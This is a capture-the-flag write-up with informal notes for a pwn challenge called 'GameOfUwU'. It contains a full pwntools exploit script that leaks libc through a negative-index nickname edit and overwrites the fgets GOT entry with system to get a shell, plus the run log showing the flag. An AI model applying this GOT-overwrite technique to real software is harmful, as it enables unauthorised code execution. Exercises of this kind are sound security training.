\x1b[H\x1b[2J\x1b[3J+-------------------------------------------------------------------------------+
|                                                         v        _(    )      |
|                                                       v         (___(__)      |
|                                                    v v                        |
|        _ ^ _                                         v                        |
|       '_\V/ `                                v  v                             |
|       ' oX`                                        v                          |
|          X                                            v                       |
|          X                                                                    |
|          X                   +                                  .             |
|          X     UwU           A_                                 |\            |
|          X.a#######a.       /\-\                                |_\           |
|       .aa##############a   _||"|_                              __|__          |
|    .a############################aa.                           \   /          |
|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+-------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------+
| [*] 1: /bin/sh                                                                |
| [*] 2: None                                                                   |
| [*] 3: None                                                                   |
| [*] 4: None                                                                   |
| [*] 5: None                                                                   |
| [*] 6: None                                                                   |
+-------------------------------------------------------------------------------+
+---MAIN MENU----------------------------------------------------------UwU------+
  Whose nickname do you want to edit? (Please enter an index)
  $ 1
\x1b[H\x1b[2J\x1b[3J+-------------------------------------------------------------------------------+
|                                                         v        _(    )      |
|                                                       v         (___(__)      |
|                                                    v v                        |
|        _ ^ _                                         v                        |
|       '_\V/ `                                v  v                             |
|       ' oX`                                        v                          |
|          X                                            v                       |
|          X                                                                    |
|          X                   +                                  .             |
|          X     UwU           A_                                 |\            |
|          X.a#######a.       /\-\                                |_\           |
|       .aa##############a   _||"|_                              __|__          |
|    .a############################aa.                           \   /          |
|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+-------------------------------------------------------------------------------+
+-------------------------------------------------------------------------------+
| [*] 1: /bin/sh                                                                |
| [*] 2: None                                                                   |
| [*] 3: None                                                                   |
| [*] 4: None                                                                   |
| [*] 5: None                                                                   |
| [*] 6: None                                                                   |
+-------------------------------------------------------------------------------+
+---MAIN MENU----------------------------------------------------------UwU------+
```



okkk......man
the remote is different again wtf


```
0x7fde13a27760
0x7fde139dd000
0x7fde13a31ae0
```

thew addresses print are the same 


```
  \x1b[H\x1b[2J\x1b[3J+-------------------------------------------------------------------------------+
|                                                         v        _(    )      |
|                                                       v         (___(__)      |

```

but the sky is corrupted

early dopamine release.....

>>> from pwn import * 
>>> x= b'\x1b[H\x1b[2J\x1b[3J+'
>>> print(int.from_bytes(x, 'little'))
13397558454280097127750720283
>>> hex(13397558454280097127750720283)
'0x2b4a335b1b4a325b1b485b1b'



from pwn import * 
import time 
binary = ("./GameOfUwU_patched")

p = process(binary)
p = remote("chal.firebird.sh", 35029)
libc = ELF('./libc.so.6')

elf = ELF(binary)
s = 'b*edit_nickname+127'
#gdb.attach(p, s)
p.sendline(b'1') # press any key to continue

#context.log_level = 'debug'
# overwriting FireUwU

p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')

p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
p.sendline(b'1')
p.sendlineafter(b"What is its new nickname?", b'/bin/sh')


p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'-2')
p.recvuntil(b"  Please get a new name to ")

# parse the leaked address to int, hex and potentially further conver to other formats 
GOT_leak = int.from_bytes(p.recvuntil(b"!", drop = True), 'little')
libc.address = GOT_leak - libc.sym['rand'] # calculate the libc base
print(hex(GOT_leak)) # debugging 
print(hex(libc.address)) # debugging 
#print(hex(libc.sym['rand']))


# preserving the leaked address, for a second entry to overwrite fgets (success)
preserved = GOT_leak.to_bytes(6, 'little')
p.sendlineafter(b"What is its new nickname?", preserved)


system_addr = libc.sym['system'] # calculate the offset of system 
print(hex(system_addr)) # debugging 


# Going to overwrite fgets, overwrite is possible know by manual test 
p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
p.sendline(b'3')
p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")

p.sendline(b'-7')
p.recvuntil(b"  Please get a new name to ")
payload = b'A' * 8 + system_addr.to_bytes(6, 'little') # index 6 to access srand and write downwards (up acutally)
p.sendlineafter(b"What is its new nickname?", payload)




┌──(kali㉿kali)-[~/Desktop/CTF/GameOfUwU]
└─$ python solve.py
[+] Starting local process './GameOfUwU_patched': pid 701390
[+] Opening connection to chal.firebird.sh on port 35029: Done
[*] '/home/kali/Desktop/CTF/GameOfUwU/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/home/kali/Desktop/CTF/GameOfUwU/GameOfUwU_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
0x7fddd804c760
0x7fddd8006000
0x7fddd8056d70
[*] Switching to interactive mode
 
  $ ls
GameOfUwU
flag.txt
$ cat flag.txt
flag{g07ch4!k1n9_0f_UwU_w45_c4u9h7!}$ @sS 

0. ~~first find the right libc version~~
1. change nickname of `FirbUwU` to `/bin/sh` so later it can be passed in as 1st argument to `system` via `fgets` 
2. leak libc address of `rand` to calculate libc address of `system`\
3. preserve the `rand` (rename it to the same address) to not let the system corrupt and go for further exploit 
4. negative indexes cannot go directly to `fgets`, thus go for the one above it i.e. `srand` and, pad with 8 bytes of `A` and overwrite `fgets` to `system` 
5. Go for option 3 again choose to rename UwU (pokemon) with index `1` so that `/bin/sh` would just pass in  


